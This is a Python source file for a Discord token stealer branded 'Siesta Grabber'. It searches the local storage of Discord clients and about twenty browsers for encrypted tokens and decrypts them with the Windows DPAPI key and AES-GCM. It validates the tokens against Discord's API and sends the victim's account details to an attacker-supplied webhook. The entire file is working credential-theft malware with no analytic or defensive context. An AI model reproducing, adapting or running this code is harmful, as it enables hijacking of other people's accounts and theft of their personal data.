from email.mime import base
import os
import requests
import win32crypt
from Crypto.Cipher import AES
import re
import json
import base64

webhook = "your_webhook_here"


alr = []
local = os.getenv("localappdata")
roaming = os.getenv("appdata")
regex = "dQw4w9WgXcQ:[^\"]*"
class Siesta:
    def decrypt(content, key):
        try:
            uncrypt = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            aes = AES.new(uncrypt, AES.MODE_GCM, content[3:15])
            return aes.decrypt(content[15:])[:-16].decode()

        except:
            return False

    def getMainKey(path):
        try:
            with open(path + f"\\Local State", "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
                file.close()
                key = base64.b64decode(key)[5:]
                return key
        except: 
            return False

    def TestToken(token):
        json = requests.get("https://discord.com/api/v9/users/@me", headers= { "authorization": token}).json()
        if not "message" in json: return json
        else: return False

    def getIP():
        json = requests.get("http://ip-api.com/json/").json()
        return json
    def Main():
        paths = Siesta.getPaths()
        tokens = []
        real = []
        for platform, path in paths.items(): 
            if not os.path.exists(path): continue
            if "cord" in platform:
                masterKey = Siesta.getMainKey(path)
            for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        files = open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore')
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(regex, x): tokens.append(values)
                    except: 
                        return False
            for n in tokens:
                n = n.split('dQw4w9WgXcQ:')[1]
                n = base64.b64decode(n)
                Token = Siesta.decrypt(n, masterKey)
                TestedToken = Siesta.TestToken(Token)
                if TestedToken is not False: real.append(TestedToken)
            for Token in real:
                embed = Siesta.getEmbed(Token)
                for p, f in Token.items(): 
                    if f == None or f == False or not f:
                        f = "None"
                    elif f == True:
                        f = "Yes"
                    field = {
                        "name": p,
                        "value": "None" if f == None else f,
                        "inline": True
                    }
                    embed[0]["fields"].append(field)
                Siesta.sendEmbed(embed)
                
            else: 
                print(path)
        return
    def getPaths():
        return {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    def getEmbed(type):
        avatar = ""
        if type["avatar"]: 
            avatar = f"https://cdn.discordapp.com/avatars/{type['id']}/{type['avatar']}.gif" 
        else: "None"
        return [{
            "image": {
                "url": "https://imgs.search.brave.com/5S3SVIftqkjVZlj14mWsWd_BNXlYk4ebqxpHHn5ig9Y/rs:fit:1200:1080:1/g:ce/aHR0cHM6Ly93YWxs/cGFwZXJjYXZlLmNv/bS93cC93cDk3MDQ2/MzkucG5n"
            },
            "color": 43690,
            "fields": [],
            "author": {
                "name": f"{type['username']} ({type['id']}) - Siesta Grabber",
            },
            "thumbnail": {
                "url": avatar
            },
            "footer": {
                "text": "Siesta Grabber - !\"Dialz_†#0069"
            }
        }]
        
    def sendEmbed(embed):
        data = {
            "embeds": embed
        }
        js = requests.post(webhook, headers= { "content-type": "application/json"}, json=data)
        print(js)        
if __name__ == "__main__": Siesta.Main()